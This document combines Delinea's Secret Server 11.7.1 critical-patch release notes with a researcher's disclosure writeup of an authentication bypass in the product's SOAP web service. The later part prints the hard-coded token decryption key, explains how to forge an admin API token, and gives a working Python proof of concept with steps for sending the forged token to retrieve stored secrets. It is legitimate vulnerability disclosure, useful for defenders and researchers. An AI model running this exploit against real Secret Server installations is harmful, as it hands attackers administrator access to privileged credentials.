# Secret Server 11.7.000001 Release Notes

Critical security releaseâWe require all Secret Server installations to be updated to this release immediately or at your earliest convenience.

Release Date (On-premises): April 13, 2024

## Security Update

We became aware of a critical vulnerability in the SOAP API which could allow an attacker to bypass authentication. The REST API was not impacted.

This update addresses the above security vulnerability and impacts all versions of Secret Server. [Hashes the for upgrade](../setup/download-hashes/index.htm) have been updated for this change.

Details are available on the [Delinea Trust Center](https://trust.delinea.com/ "visit Delinea Trust Center"). Please register and subscribe to get future updates directly to your inbox.

The direct link to the topic is [Secret Server Vulnerability](https://trust.delinea.com/?tcuUid=17aaf4ef-ada9-46d5-bf97-abd3b07daae3%20).

## Remediation

The direct link to the topic is [Secret Server Vulnerability](https://trust.delinea.com/?tcuUid=17aaf4ef-ada9-46d5-bf97-abd3b07daae3%20 "Secret Server Vulnerability").

### Remediation

If your Secret Server instance is exposed to the public internet, you are at significant risk and you should perform these steps immediately.

1. Use the [Remediation Guide](https://support.delinea.com/s/article/KB-010572-How-do-I-remediate-Secret-Server-in-reference-to-the-Secret-Server-SOAP-vulnerability "Remediation Guide") to modify the Secret Server implementation to mitigate the vulnerability
2. As a precautionary measure rotate your passwords often until mitigation is in place.
3. Use the [Remediation Guide](https://support.delinea.com/s/article/KB-010572-How-do-I-remediate-Secret-Server-in-reference-to-the-Secret-Server-SOAP-vulnerability "Remediation Guide") to examine audit histories for any evidence of exploitation
4. As soon as the patch is available, patch all systems.

The support team is available to guide your team through these steps and answer any questions from you or your team.

### Delinea Platform and Secret Server Cloud

Delinea Platform and Secret Server Cloud have been patched and are no longer vulnerable.

### Step Upgrade Process

* A Step Upgrade is required from versions prior to 11.5.2 (11.5.000002) before you can upgrade to 11.7.1 (11.7.000001).
* The automatic downloads in the product will get the right versions for the step upgrade and then allow the 11.7.000001 upgrade.
* If offline and using the file upload method, versions prior to 11.5.2 will get an error message saying, "Integrity Check failed - Security Catalog is signed by thumbprint that is not specifically trusted." The remedy is to first upgrade to 11.5.000002 (or 11.5.000003) and then do the upgrade to 11.7.000001.

For instructions on upgrading in general, go to [Upgrading](../setup/upgrading/upgrade-overview/upgrade-overview.htm)
### If You Cannot Upgrade to 11.7.1

If you are on an older version of Secret Server and you cannot upgrade to the latest version, please contact our support team for assistance and guidance.

* Prevented Thycotic One sync from syncg Platform native users. This allows Platform native users to log in the rare situation they synced with Thycotic One. Then the administrator clears the system Platform User mappings.

## Secret Server is the Foundation for Successful PAM Security

The standard definition of PAM isn’t sufficient for the growing risk of cyberattacks. We believe PAM must address the exploding number of identities and today’s IT complexities.

Our products provide effective authorization controls for an identity-centric approach to security.

**Update:**

04/30/2024 — MITRE assigned [CVE-2024–33891](https://nvd.nist.gov/vuln/detail/CVE-2024-33891)

04/13/2024 — The patch 11.7.1 for Delinea Secret Server is available — <https://docs.delinea.com/online-help/secret-server/release-notes/ss-rn-11-7-000001.htm>

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —

[Delinea Secret Server](https://docs.delinea.com/online-help/secret-server/start.htm) is a privileged access management (PAM) solution that helps organizations secure, manage, and monitor privileged accounts and access across their IT infrastructure.

Accessing the application through the web UI requires standard username and password authentication. Additionally, it supports supplementary security measures like 2FA. Moreover, the application provides a set of web services accessible via an API token.

As part of my personal security research, I downloaded the [Delinea Secret Server On-Permises](https://support.delinea.com/s/download-onprem) to hunt for vulnerabilities. The product’s version at the time I downloaded it was **16.000004**. After installing the product, I looked into its directory and noted it was an ASP.NET application. I immediately review the **web.config** file as it serves as a roadmap to where potential attack surface could be at. I was looking for pages and resources that do not require AuthN/AuthZ. I found a webservice endpoint that did not sit behind a login page,

* SecretServer/webservices/SSWebService.asmx

![]()

and I explored the APIs to evaluate their functionalities.

Unfortunately, I could not exercise the APIs as they require an API token.

My initial thought was it would be a waste of effort to audit the API token implementation, as I felt such critical component would’ve went through rigorous security review. I took a leap of faith and dived into the decompiled code, which led me to astonishing discoveries.

For all web service requests, the API token is checked for validity via **Thycotic.ihawu.Business.Authentication** NS -> **ValidTokenProvider** class -> **IsValidToken** function from **Thycotic.ihawu.Business.dll**

```
... snipped ...
 authenticationTicket = this._oAuthAuthOptions.AccessTokenFormat.Unprotect(encryptedToken);
 num = (short)883621889;
 num2 = (int)((IntPtr)num);
 continue;
... snipped ...
```

The **IsValidToken** function will first deserialize the API token by calling the **Thycotic.Identity.Formatters** NS -> **SecureTokenFormatter** class -> **Unprotect** function from **Thycotic.Identity.dll.** The deserialization comprise of the following steps:

1. Base64 decode incoming string (API token)
2. Decrypt the decoded string (API token)
3. Deserialize the decrypted content into a **Microsoft.Owin.Security.AuthenticationTicket** object

```
public AuthenticationTicket Unprotect(string text)
  {
   byte[] protectedData = this._encoder.Decode(text);
   byte[] data = this._protector.Unprotect(protectedData);
   return this._serializer.Deserialize(data);
  }
```

The first discovery resides in the **Unprotect** function, where it decrypts the API token with a hard-coded key.

The **Unprotect** function is located in **Thycotic.Identity.dll** -> **Thycotic.Identity.Protectors** NS -> **ThycoticDataProtector** class.

```
public byte[] Unprotect(byte[] protectedData)
{
byte[] key = this._keyProvider.GetKey();
if (key == null)
{
throw new SecurityException("Invalid Key");
}
byte[] first = protectedData.Take(2).ToArray<byte>();
... snipped ...
```

The call to **\_keyProvider.GetKey()** leads to the following:

```
namespace Thycotic.Identity.Providers
{
// Token: 0x02000009 RID: 9
public class KeyProvider : IKeyProvider
{
// Token: 0x06000017 RID: 23 RVA: 0x000021CA File Offset: 0x000003CA
public byte[] GetKey()
{
return new byte[]
{
94,
236,
230,
169,
211,
147,
133,
245,
121,

177,

151,
171,
17,
83,
67,
193,
141
};
}
}
}
```

The uncovering of hard-coded key served as a motivator to investigate the rest of the API token checking mechanism.

When the API token is deserialized into a **Microsoft.Owin.Security.AuthenticationTicket** object, the next step in the **IsValidToken** function is to retrieve the user profile from it.

```
... snipped ...
IL_291:
user = this._owinClaimHelper.GetUser(authenticationTicket.Identity.Claims);
num = (short)235012100;
num2 = (int)((IntPtr)num);
... snipped ...
```

The **GetUser** function is located in **Thycotic.ihawu.Business.Authentication** NS -> **OwinClaimHelper** class under **Thycotic.ihawu.Business.dll**, and this logic retrieves the user profile from the **nameidentifier** property which holds an Integer string.

![]()

Through dynamic analysis, I observed every user profile is represented with an Integer value in consecutive order. Integer **2** is always the **Admin** user (*note:* This user profile gets create as part of the installation of the application).

The attack path is starting to take shape. If we know the hard-coded key to deserializing the API token and we know the Integer value associated with the Admin profile, we should be able to craft a serialized API token with Admin role, and net access to any Delinea Secret Server’s protected resources through the web services API.

The story is not complete without encountering and getting pass roadblock. I encountered a hurdle in this section of the **IsValidToken** function:

```
... snipped ..
Claim claim;
Guid oauthExpirationId = new Guid(claim.Value);
oauthExpiration = this._oAuthExpirationService.Load(oauthExpirationId);
num = (short)455344133;
num2 = (int)((IntPtr)num);
... snipped ...
```

The **oauthExpirationId** property is accessible through **Microsoft.Owin.Security.AuthenticationTicket** object, and this property contains a UUIDv4 value that gets generated per user authentication. For example, when user Admin authenticates through the web UI, an **AuthenticationTicket** object is created along with a timestamp that is stored in the application cache. When a user access a web service with an API token, the deserialized **AuthenticationTicket** object will use the UUIDv4 value stored in **oauthExpirationId** to reference the timestamp in application cache to determine when the associated **AuthenticationTicket** object was created. This is to ensure an API token is tied to an authenticated user.

![]()

This puts a stop towards the attack path because there is no way to determine a valid UUIDv4 value generated by the application. The goal of crafting a AuthN/AuthZ bypass vanished.

While I encountered setback, what is the next best thing I can do? It turns out the UUIDv4 value does not have any association with a user profile. So user Alice can use user Bob’s **oauthExpirationId** UUIDv4 value as long as the referenced timestamp have not expired. I was able to figured this out by editing the values manually with the DnSpy debugger. This gives an avenue for a Local Privilege Escalation path:

1. A low privileged user (Bob) authenticates to the application and collect its API token.

2. Bob examines its API token and extract the **oauthExpirationId** value.

3. Bob crafts an Admin privileged **AuthenticationTicket** with the **nameidentifer** property set to **2**, and the **oauthExpirationId** it had from its original API token, and finishes off with encrypting and serializing the **AuthenticationTicket** into an API token with the hard-coded key.

This is a pretty good attack path, but I wasn’t satisfy with the result. My instinct tells me there should be a way with getting a full AuthN/AuthZ bypass, and I should not settle for a LPE.

The final discovery that led to a full AuthN/AuthZ bypass for any Delinea Secret Server is very simple and was something I overlooked. It turns out if I remove the **oauthExpirationId** attribute from the **AuthenticationTicket** object, the timestamp check will not get invoked!

Coincidentally after my discovery, Delinea released version **11.6.000025** of their Secret Server, which still have the security issues described in this blog post.

**3/28/2024 Update**: Delinea Secret Server latest version **11.7.000000** is vulnerable as well.

**PoC || GTFO**

1. Download Delinea Secret Server and install it ([**https://support.delinea.com/s/download-onprem**](https://support.delinea.com/s/download-onprem)) — to use their DLL files.

2. Install python, for my instance, python is installed to **C:\Users\Administrator\AppData\Local\Programs\Python\Python312\python.exe**

3. Install **pythonnet**, which allows python to talk to .NET: **C:\Users\Administrator\AppData\Local\Programs\Python\Python312\python.exe -m pip install pythonnet**

4. Open **cmd.exe** and go to **C:\inetpub\wwwroot\SecretServer\bin**

5. Run **C:\Users\Administrator\AppData\Local\Programs\Python\Python312\python.exe** under **C:\inetpub\wwwroot\SecretServer\bin**

6. Copy & Paste the following python code into Python interpreter to generate the Golden token:

```
import clr
clr.AddReference("Thycotic.Identity")
clr.AddReference("Microsoft.Owin.Security")
import sys
from System import *
from System.Security.Claims import *
from Microsoft.Owin.Security import *
from Thycotic.Identity.Providers import *
from Thycotic.Identity.Formatters import *
from Thycotic.Identity.Protectors import *

def buildToken(id):
   claimsIdentity = ClaimsIdentity("ExternalBearer", "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name", "http://schemas.microsoft.com/ws/2008/06/identity/claims/role")
   claimsIdentity.AddClaim(Claim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier", str(id), "http://www.w3.org/2001/XMLSchema#integer", "Thycotic.Identity", "Thycotic.Identity"))
   properties = AuthenticationProperties()
   properties.IssuedUtc = DateTimeOffset.UtcNow.Add(TimeSpan(0,0,0,0))
   properties.IsPersistent = False
   authenticationTicket = AuthenticationTicket(claimsIdentity, properties)
   keyProvider = KeyProvider()
   dataProtector = ThycoticDataProtector(keyProvider)
   secureTokenFormatter = SecureTokenFormatter(dataProtector)
   token = secureTokenFormatter.Protect(authenticationTicket)
   return token

buildToken(2)
```

7. Browse to **http://<target>/SecretServer/webservices/SSWebService.asmx?op=WhoAmI** and paste the token into the POST field and observe the **Admin** profile is returned. ***note:*** <target> can be localhost

8.

For more serious impact:

Make a SOAP request to **http://<target>/SecretServer/webservices/SSWebService.asmx?op=SearchSecrets** — to obtain stored secrets
